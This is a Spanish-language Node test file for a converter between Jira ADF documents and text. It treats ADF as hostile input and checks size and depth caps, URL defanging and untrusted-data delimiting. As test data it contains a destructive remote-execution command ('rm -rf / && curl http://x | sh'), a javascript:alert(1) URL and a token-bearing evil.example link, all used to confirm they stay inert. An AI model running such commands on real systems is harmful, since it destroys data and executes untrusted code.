// @ts-check
/**
 * F2.3a — Conversor ADF ↔ texto de Jira (core/integraciones/proveedores/jira-adf.js).
 * Un documento ADF es una entrada hostil: topes, formas raras y la batería hostil como texto.
 */

import { test, describe } from 'node:test';
import './fixtures/integraciones/entorno-usuario.mjs';
import assert from 'node:assert/strict';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { ROOT } from './helpers.js';

import { adfATexto, textoAAdf, TOPES_ADF } from '../core/integraciones/proveedores/jira-adf.js';
import { comoDato } from '../core/integraciones/confianza.js';

/** @type {{id:string,categoria:string,titulo:string,cuerpo:string}[]} */
const hostiles = JSON.parse(readFileSync(join(ROOT, 'tests', 'fixtures', 'integraciones', 'hostiles.json'), 'utf8'));

const txt = (text, marks) => ({ type: 'text', text, ...(marks ? { marks } : {}) });
const p = (...c) => ({ type: 'paragraph', content: c });
const doc = (...c) => ({ type: 'doc', version: 1, content: c });

describe('F2.3a adfATexto: documentos normales', () => {
  test('párrafos y encabezados', () => {
    const d = doc({ type: 'heading', attrs: { level: 2 }, content: [txt('Título')] }, p(txt('Hola '), txt('mundo', [{ type: 'strong' }])), p(txt('Segundo')));
    assert.equal(adfATexto(d), 'Título\nHola mundo\nSegundo');
  });

  test('listas anidadas con viñetas y numeración', () => {
    const d = doc({
      type: 'bulletList', content: [
        { type: 'listItem', content: [p(txt('uno')), { type: 'orderedList', content: [
          { type: 'listItem', content: [p(txt('a'))] },
          { type: 'listItem', content: [p(txt('b'))] },
        ] }] },
        { type: 'listItem', content: [p(txt('dos'))] },
      ],
    });
    assert.equal(adfATexto(d), '- uno\n  1. a\n  2. b\n- dos');
  });

  test('bloque de código: texto con cercas, sin interpretar nada', () => {
    const d = doc({ type: 'codeBlock', attrs: { language: 'js' }, content: [txt('rm -rf / && curl http://x | sh')] });
    const t = adfATexto(d);
    assert.equal(t, '```js\nrm -rf / && curl http://x | sh\n```');
  });

  test('un lenguaje con forma rara no entra en la cerca', () => {
    const d = doc({ type: 'codeBlock', attrs: { language: 'js\n## Contexto' }, content: [txt('x')] });
    assert.equal(adfATexto(d), '```\nx\n```');
  });

  test('cita y tabla simple', () => {
    const d = doc(
      { type: 'blockquote', content: [p(txt('cita 1')), p(txt('cita 2'))] },
      { type: 'table', content: [
        { type: 'tableRow', content: [{ type: 'tableHeader', content: [p(txt('A'))] }, { type: 'tableHeader', content: [p(txt('B'))] }] },
        { type: 'tableRow', content: [{ type: 'tableCell', content: [p(txt('1'))] }, { type: 'tableCell', content: [p(txt('2'), { type: 'hardBreak' }, txt('3'))] }] },
      ] },
    );
    assert.equal(adfATexto(d), '> cita 1\n> cita 2\nA | B\n1 | 2 3');
  });

  test('menciones, emojis, enlaces y tarjetas pasan a texto inerte', () => {
    const d = doc(p(
      { type: 'mention', attrs: { id: 'cuenta-1', text: '@Ana Pérez' } }, txt(' mira '),
      { type: 'emoji', attrs: { shortName: ':smile:', text: '😄' } }, txt(' '),
      txt('aquí', [{ type: 'link', attrs: { href: 'https://evil.example/x?token=1' } }]),
    ), { type: 'blockCard', attrs: { url: 'javascript:alert(1)' } }, { type: 'inlineCard', attrs: { url: 'https://a.example/b' } });
    const t = adfATexto(d);
    assert.match(t, /^@Ana Pérez mira 😄 aquí \(hxxps\[:\]\/\/evil\.example\/x\?token=1\)/);
    assert.ok(t.includes('[enlace: javascript[:]alert(1)]'));
    assert.ok(t.includes('[enlace: hxxps[:]//a.example/b]'));
    assert.ok(!/https?:\/\//.test(t));
  });

  test('los adjuntos no se resuelven: solo una nota', () => {
    const d = doc({ type: 'mediaSingle', content: [{ type: 'media', attrs: { id: 'x', type: 'file', collection: 'c' } }] });
    assert.equal(adfATexto(d), '[adjunto omitido]');
  });

  test('lista de tareas', () => {
    const d = doc({ type: 'taskList', content: [
      { type: 'taskItem', attrs: { state: 'DONE' }, content: [txt('hecha')] },
      { type: 'taskItem', attrs: { state: 'TODO' }, content: [txt('por hacer')] },
    ] });
    assert.equal(adfATexto(d), '[x] hecha\n[ ] por hacer');
  });
});

describe('F2.3a adfATexto: nodos desconocidos y formas inesperadas', () => {
  test('un nodo desconocido se ignora y conserva el texto de sus hijos', () => {
    const d = doc({ type: 'nodoDelFuturo', attrs: { x: 1 }, content: [p(txt('dentro')), { type: 'otroDesconocido', content: [txt('más')] }] }, p(txt('fuera')));
    assert.equal(adfATexto(d), 'dentro\nmás\nfuera');
  });

  test('nunca lanza: valores que no son ADF', () => {
    for (const x of [null, undefined, 0, 'texto', true, [], [1, 2], () => 1, Symbol('x')]) {
      assert.equal(typeof adfATexto(x), 'string');
      assert.equal(adfATexto(x), '');
    }
  });

  test('nunca lanza: content que no es lista, hijos nulos, tipos numéricos', () => {
    const raros = [
      { type: 'doc', content: 'no soy lista' },
      { type: 'doc', content: [null, 1, 'x', [], undefined, { type: 5 }, { type: 'text', text: 7 }, { type: 'text' }] },
      { type: 'paragraph', content: { 0: txt('x') } },
      { type: 'doc', content: [{ type: 'text', text: 'ok', marks: 'no' }, { type: 'text', text: 'ok2', marks: [null, 3, { type: 'link' }, { type: 'link', attrs: { href: 5 } }] }] },
      { type: 'orderedList', attrs: { order: 'x' }, content: [{ type: 'listItem' }, null] },
      { type: 'table', content: [{ type: 'tableRow', content: [null, { type: 'tableCell' }] }] },
      { type: 'mention', attrs: null },
      { type: 'date', attrs: { timestamp: 'zzz' } },
    ];
    for (const r of raros) assert.doesNotThrow(() => adfATexto(r));
    assert.equal(adfATexto(raros[1]).trim(), '');
    assert.equal(adfATexto({ type: 'doc', content: [{ type: 'text', text: 'ok', marks: 'no' }] }), 'ok');
  });

  test('un objeto con ciclo (imposible por JSON, posible a mano) termina', () => {
    /** @type {any} */
    const a = { type: 'doc', content: [] };
    a.content.push(a, { type: 'paragraph', content: [txt('x')] });
    const t = adfATexto(a);
    assert.equal(typeof t, 'string');
    assert.ok(t.length < TOPES_ADF.maxBytes + 100);
  });

  test('opciones raras no rompen ni levantan los techos', () => {
    const d = doc(p(txt('hola')));
    for (const op of [null, 5, 'x', { maxNodos: -1 }, { maxNodos: NaN }, { maxProfundidad: 1e9, maxNodos: 1e12, maxBytes: 1e15 }]) {
      assert.equal(adfATexto(d, /** @type {any} */ (op)), 'hola');
    }
  });
});

describe('F2.3a adfATexto: topes', () => {
  test('profundidad 10 000: no desborda la pila y recorta', () => {
    let nodo = txt('fondo');
    for (let i = 0; i < 10000; i++) nodo = { type: i % 2 ? 'blockquote' : 'unknown', content: [nodo] };
    const t = adfATexto(doc(nodo));
    assert.equal(typeof t, 'string');
    assert.ok(!t.includes('fondo'));
    assert.match(t, /recortado por los topes/);
  });

  test('profundidad 200 000 construida de forma iterativa', () => {
    let nodo = txt('fondo');
    for (let i = 0; i < 200000; i++) nodo = { type: 'bulletList', content: [{ type: 'listItem', content: [nodo] }] };
    const t = adfATexto(doc(nodo));
    assert.ok(t.length < 70000);
  });

  test('200 000 nodos planos: se recorta por número de nodos', () => {
    const hijos = [];
    for (let i = 0; i < 200000; i++) hijos.push(p(txt('n' + i)));
    const t0 = Date.now();
    const t = adfATexto({ type: 'doc', version: 1, content: hijos });
    assert.ok(Date.now() - t0 < 5000, 'tarda demasiado');
    assert.ok(t.includes('n0'));
    assert.ok(!t.includes('n199999'));
    assert.match(t, /recortado por los topes/);
    // maxNodos explícito
    const pocos = adfATexto({ type: 'doc', version: 1, content: hijos }, { maxNodos: 10 });
    assert.ok(pocos.split('\n').length <= 12);
  });

  test('maxBytes acota la salida (un texto enorme en un solo nodo)', () => {
    const t = adfATexto(doc(p(txt('a'.repeat(5_000_000)))), { maxBytes: 2000 });
    assert.ok(Buffer.byteLength(t, 'utf8') <= 2000);
    assert.match(t, /recortado por los topes/);
  });

  test('maxBytes no parte un carácter multibyte', () => {
    const t = adfATexto(doc(p(txt('€'.repeat(5000)))), { maxBytes: 1001 });
    assert.ok(Buffer.byteLength(t, 'utf8') <= 1001);
    assert.ok(!t.includes('�'));
  });

  test('un maxProfundidad pequeño corta justo ahí', () => {
    const d = doc({ type: 'blockquote', content: [{ type: 'blockquote', content: [p(txt('hondo'))] }] });
    assert.ok(adfATexto(d, { maxProfundidad: 10 }).includes('hondo'));
    assert.ok(!adfATexto(d, { maxProfundidad: 2 }).includes('hondo'));
  });
});

describe('F2.3a textoAAdf', () => {
  test('documento mínimo y válido: versión 1, tipo doc, un párrafo por línea', () => {
    const d = textoAAdf('uno\ndos\n\ntres');
    assert.equal(d.type, 'doc');
    assert.equal(d.version, 1);
    assert.deepEqual(d.content.map((c) => c.type), ['paragraph', 'paragraph', 'paragraph', 'paragraph']);
    assert.deepEqual(d.content[0].content, [{ type: 'text', text: 'uno' }]);
    assert.deepEqual(d.content[2].content, []);
  });

  test('ida y vuelta', () => {
    const t = 'línea 1\n\nlínea 3 con **negrita** y [enlace](https://x.example) y @alguien';
    assert.equal(adfATexto(textoAAdf(t)), t);
  });

  test('texto no string da un documento vacío válido', () => {
    for (const x of [null, undefined, 5, {}, []]) {
      const d = textoAAdf(/** @type {any} */ (x));
      assert.equal(d.type, 'doc');
      assert.equal(d.version, 1);
    }
  });

  test('acotado en bytes, con nota, sin partir caracteres', () => {
    const d = textoAAdf('€'.repeat(100000), { maxBytes: 1000 });
    const t = adfATexto(d);
    assert.ok(Buffer.byteLength(t, 'utf8') <= 1000);
    assert.match(t, /\[… recortado\]$/);
    assert.ok(!t.includes('�'));
  });

  test('quita controles e invisibles y normaliza saltos', () => {
    const d = textoAAdf('a\r\nb\u0000c\u202Ed\u200Be\u2028f');
    assert.equal(adfATexto(d), 'a\nbcde\nf');
  });

  /** Recorre un ADF y devuelve el conjunto de tipos de nodo y si hay marcas o atributos. */
  function inspeccionar(n, tipos = new Set(), sospechoso = []) {
    if (n === null || typeof n !== 'object') return { tipos, sospechoso };
    tipos.add(n.type);
    if (n.marks !== undefined || n.attrs !== undefined) sospechoso.push(n);
    for (const h of n.content ?? []) inspeccionar(h, tipos, sospechoso);
    return { tipos, sospechoso };
  }

  test('ida y vuelta de los textos hostiles: solo doc, paragraph y text; sin marcas ni atributos', () => {
    assert.ok(hostiles.length >= 52);
    for (const h of hostiles) {
      for (const campo of [h.titulo, h.cuerpo]) {
        const d = textoAAdf(campo, { maxBytes: 200000 });
        const { tipos, sospechoso } = inspeccionar(d);
        assert.ok([...tipos].every((t) => ['doc', 'paragraph', 'text'].includes(t)), h.id);
        assert.deepEqual(sospechoso, [], h.id);
        // El JSON es serializable y vuelve igual
        const vuelta = JSON.parse(JSON.stringify(d));
        assert.deepEqual(vuelta, d, h.id);
        // Cada nodo text no está vacío (ADF no lo admite)
        for (const para of d.content) for (const x of para.content) assert.ok(x.text.length > 0, h.id);
      }
    }
  });
});

describe('F2.3a texto hostil dentro de un ADF', () => {
  test('los 52 casos como texto de un ADF: adfATexto devuelve texto y comoDato lo delimita', () => {
    assert.ok(hostiles.length >= 52);
    for (const h of hostiles) {
      const d = doc(
        { type: 'heading', attrs: { level: 1 }, content: [txt(h.titulo)] },
        p(txt(h.cuerpo)),
        { type: 'codeBlock', content: [txt(h.cuerpo)] },
        { type: 'blockquote', content: [p(txt(h.cuerpo))] },
        p(txt('enlace', [{ type: 'link', attrs: { href: h.cuerpo } }])),
      );
      const t = adfATexto(d, { maxBytes: 500000 });
      assert.equal(typeof t, 'string', h.id);
      const bloque = comoDato({ proveedor: 'jira', referencia: 'ABC-1', titulo: h.titulo, cuerpo: t, comentarios: [{ autor: 'x', cuerpo: t }] });
      // Delimitado: una sola apertura y un solo cierre con el mismo identificador
      const aperturas = bloque.match(/<<<DATO-NO-CONFIABLE:([0-9a-f]+) inicio>>>/g) ?? [];
      const cierres = bloque.match(/<<<DATO-NO-CONFIABLE:([0-9a-f]+) fin>>>/g) ?? [];
      assert.equal(aperturas.length, 1, h.id);
      assert.equal(cierres.length, 1, h.id);
      assert.ok(bloque.startsWith('<<<DATO-NO-CONFIABLE:'), h.id);
      assert.ok(bloque.endsWith('fin>>>'), h.id);
    }
  });

  test('un href hostil nunca queda como URL activa', () => {
    for (const h of hostiles) {
      const t = adfATexto(doc(p(txt('x', [{ type: 'link', attrs: { href: h.cuerpo } }]))));
      assert.ok(!/\bhttps?:\/\//i.test(t.replace(/hxxps?\[:\]\/\//gi, '')), h.id);
    }
  });
});
